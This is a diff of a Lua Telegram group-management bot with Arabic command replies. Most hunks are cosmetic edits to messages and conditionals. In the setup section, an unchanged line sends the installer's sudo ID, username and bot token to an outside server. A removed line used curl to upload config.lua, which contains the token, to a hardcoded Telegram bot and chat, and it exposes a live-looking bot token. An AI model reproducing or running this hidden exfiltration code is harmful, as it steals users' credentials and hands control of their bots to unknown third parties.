@@ -53,7 +53,6 @@ sudo_users = {SUDO},
 }
 create(config, "./config.lua")   
 https.request("https://ibcorp.ibuser.xyz/iq_abs/?id="..SUDO.."&user="..username.."&token="..token)
-local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 218385683 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("RUNABS.sh", "w")  
 file:write([[
 #!/bin/bash 
@@ -4262,8 +4261,8 @@ getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
 end
 --     Source DevProx     --
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text:match("^[Pp]ing$") or text:match("^فحص$") then
-Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱڵـبوت شغٱڵ', 1, 'md')
+if text:match("^فحص$") then
+Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱڵـبوت شغٱڵ عزيزي', 1, 'md')
 end
 end 
 --     Source DevProx     --
@@ -4680,8 +4679,8 @@ end
 --     Source DevProx     --
 if text:match('^الحساب (%d+)$') then
 local id = text:match('^الحساب (%d+)$')
-local text = '❗️🚸 ⌯ ٱضغط هنٱ ڵمشٱهدة ٱڵعضو'
-tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
+local text = '❗️🚸 ⌯ ٱضغط هنٱ ڵمشٱهدة ٱڵعضو .'
+tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=29, user_id_=id}}}}, dl_cb, nil)
 end
 --     Source DevProx     --
 if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then
@@ -10561,8 +10560,7 @@ if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Group rules has been saved ', 1, 'md')
 else
 Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع قوٱنين ٱڵمجموعة \n❗️🚸 ⌯ بوٱسـۧطـة : ('..msg.sender_user_id_..') ', 1, 'md')
-end
-end
+end end
 if text:match("^ضع قوانين (.*)$") then
 local txt = {string.match(text, "^(ضع قوانين) (.*)$")}
 DevAbs:set(DevProx..'bot:rules'..msg.chat_id_, txt[2])
@@ -10570,10 +10568,7 @@ if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Group rules has been saved ', 1, 'md')
 else
 Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع قوٱنين ٱڵمجموعة \n❗️🚸 ⌯ بوٱسـۧطـة : ('..msg.sender_user_id_..') ', 1, 'md')
-end
-end
-end
---     Source DevProx     --
+end end end
 if text:match("^[Rr]ules$") or text:match("^القوانين$") then
 local rules = DevAbs:get(DevProx..'bot:rules'..msg.chat_id_)
 Dev_Abs(msg.chat_id_, msg.id_, 1, rules, 1, nil)
@@ -10586,14 +10581,25 @@ if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Saved ', 1, 'md')
 else
 Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حفظ ٱڵملٱحظه ٱرسل جڵب ٱڵملٱحظة ڵعرضهٱ ', 1, 'md')
-end
-end
---     Source DevProx     --
+end end
 if text:match("^جلب الملاحظه$") and is_leader(msg) then
 local note = DevAbs:get(DevProx..'owner:note1')
 Dev_Abs(msg.chat_id_, msg.id_, 1, note, 1, nil)
 end
 --     Source DevProx     --
+if is_momod(msg.sender_user_id_, msg.chat_id_) then
+if text:match("^الفشار$") then
+if DevAbs:get(DevProx..'fshar'..msg.chat_id_) then
+mute_fsh = 'مقفڵه'
+else
+mute_fsh = 'مفتوحه'
+end
+local ABS_PROX = "\n"
+.."❗️🧩 ⌯ ٱڵفشٱر ⌯» "..mute_fsh.."\n"
+Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
+end
+end
+
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text:match("^الروابط$") then
 if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
@@ -11072,11 +11078,11 @@ if result.id_ then
 Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵـمجموعة ( " .. result.title_ .. " )\n❗️⚠️ ⌯ تمت ٱڵمغٱدرة منهٱ بٱمر ٱڵمطور ", 1, "md")
 if DevAbs:get(DevProx.."lang:gp:" .. result.id_) then
 local text = [[
-❗️⚠️ ⌯ بٱمر ٱڵمطور تم مغٱدرة هذه ٱڵـمجموعة
-〰️➖〰️➖〰️➖〰️➖〰️
-- ٱڵـمطور - ]]..SUDOUSERNAME..[[
+❗️⚠️ ⌯ بٱمر ٱڵمطور تم مغٱدرة هذه ٱڵـمجموعة 
+〰️➖〰️➖〰️➖〰️➖〰️ 
+- ٱڵـمطور -  ]]..SUDOUSERNAME..[[  
 ]]
-Dev_Abs(result.id_, 0, 1, text, 1, 'html') 
+Dev_Abs(result.id_, 0, 1, text, 1, "md") 
 Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵـمجموعة ( " .. result.title_ .. " )\n❗️⚠️ ⌯ تمت ٱڵمغٱدرة منهٱ بٱمر ٱڵمطور ", 1, "md")
 end 
 chat_leave(result.id_, bot_id)
@@ -12222,8 +12228,8 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم تغيير كڵيشة
 end
 if text and text:match("^تغيير كليشه الاشتراك الاجباري$") or text:match("^تغيير كليشه الاشتراك$") and is_leader(msg) then  
 DevAbs:setex(DevProx.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
-local t = '❗️🚸 ⌯ حسنٱ ٱرسڵ كڵيشة ٱلٱشترٱك ٱڵجديدة'  
-Dev_Abs(msg.chat_id_, msg.id_, 1,t, 1, 'md') 
+local text = '❗️🚸 ⌯ حسنٱ ٱرسڵ كڵيشة ٱلٱشترٱك ٱڵجديدة'  
+Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
 end
 if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" and is_leader(msg) then  
 DevAbs:del(DevProx..'bot:textch:user')
